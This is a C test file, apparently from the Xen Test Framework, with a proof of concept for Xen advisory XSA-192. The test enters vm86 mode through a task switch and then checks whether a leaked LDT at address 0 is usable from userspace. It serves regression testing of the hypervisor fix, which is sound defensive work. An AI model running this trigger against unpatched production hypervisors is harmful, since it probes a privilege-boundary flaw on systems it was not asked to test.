/**
 * @file tests/xsa-192/main.c
 * @ref test-xsa-192
 *
 * @page test-xsa-192 XSA-192
 *
 * Advisory: [XSA-192](http://xenbits.xen.org/xsa/advisory-xsa-192.html)
 *
 * Before XSA-192, a bug existed with Xen's handling of task switches into
 * vm86 mode, whereby LDTR got loaded with vm86 attributes.
 *
 * On Intel hardware, this causes a vmentry failure because of LDTR
 * consistency checks.  AMD hardware performs less in the way consistency
 * checking, and ends up loading a real LDT starting at 0, which stays around
 * even after context switching back into the kernel.
 *
 * This test enters vm86 mode via task switch, exits immediately, context
 * switches into userspace, and checks whether a usable LDT is present at 0.
 *
 * @see tests/xsa-192/main.c
 */
#include <xtf.h>

#include <arch/x86/desc.h>
#include <arch/x86/exinfo.h>
#include <arch/x86/idt.h>

const char test_title[] = "XSA-192 PoC";

/* IDT handler to return from vm86 mode. */
void ret_from_vm86(void);
asm(".align 16;"
    "ret_from_vm86:"
    "mov $" STR(__USER_DS) ", %edx;"
    "mov %edx, %ds;"
    "mov %edx, %es;"
    "mov %edx, %fs;"
    "mov %edx, %gs;"
    "mov %dr0, %esp;"
    "jmp .Ltss_ret_point;"
    );

/* Virtual 8068 task. */
hw_tss vm86_tss __aligned(16) =
{
    .eflags = X86_EFLAGS_VM | X86_EFLAGS_IOPL | X86_EFLAGS_MBS,
    .eip    = 0x1000,
    .cs     = 0,
    .ss     = 0,

    .esp0   = (unsigned long)&boot_stack[2 * PAGE_SIZE],
    .ss0    = __KERN_DS,
    .ldtr   = 0,

    .iopb   = X86_TSS_INVALID_IO_BITMAP,
};

unsigned long user_ldt_use(void)
{
    exinfo_t fault = 0;

    /* Try and use the possibly-loaded LDT at 0. */
#define LDTE    0
#define LDT_SEL ((LDTE << 3) | X86_SEL_LDT | 3)
    user_desc *ldt = _p(zeroptr);

    ldt[LDTE] = gdt[__USER_DS >> 3];
    barrier();

    /* Attempt to load %fs from the LDT. */
    asm volatile ("1: mov %[sel], %%fs; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, ex_record_fault_eax)
                  : "+a" (fault)
                  : [sel] "r" (LDT_SEL));

    return fault;
}

void test_main(void)
{
    struct xtf_idte idte =
    {
        .addr = (unsigned long)ret_from_vm86,
        .cs   = __KERN_CS,
        .dpl  = 3,
    };

    /* Hook ret_from_vm86(). */
    xtf_set_idte(X86_VEC_AVAIL, &idte);

    /* Create the vm86 TSS descriptor. */
    gdt[GDTE_AVAIL0] =
        (user_desc)INIT_GDTE((unsigned long)&vm86_tss, 0x67, 0x89);

    /* Copy a stub to somewhere vm86 can actually reach. */
    uint8_t insn_buf[] = { 0xcd, X86_VEC_AVAIL }; /* `int $X86_VEC_AVAIL` */
    memcpy(_p(vm86_tss.eip), insn_buf, ARRAY_SIZE(insn_buf));

    /*
     * Explicitly clobber the current LDT.  AMD leaks the LDT base/limit when
     * loading a NULL selector, so load an explicit one first to be certain.
     */
    if ( vendor_is_amd )
    {
        gdt[GDTE_AVAIL1] = (user_desc)INIT_GDTE(0, 0, 0x82);
        lldt(GDTE_AVAIL1 << 3);
    }
    lldt(0);

    /*
     * Stash the stack in %dr0, and enter the vm86 task.  It should exit
     * immediately and jump back here.
     */
    asm volatile ("mov %%esp, %%dr0;"
                  "jmp $%c[vm86_tss_sel], $0;"
                  ".Ltss_ret_point:;"
                  :: [vm86_tss_sel] "i" (GDTE_AVAIL0 << 3));

    /* "Context switch" to userspace to try and use the erroneous LDT. */
    exinfo_t fault = exec_user(user_ldt_use);

    switch ( fault )
    {
    case EXINFO_SYM(GP, LDT_SEL & ~X86_SEL_RPL_MASK):
        xtf_success("Success: LDT not valid\n");
        break;

    case 0:
        xtf_failure("Failure: Leaked valid LDT at 0\n");
        break;

    default:
        xtf_error("Error: Unexpected fault %08x\n", fault);
        break;
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
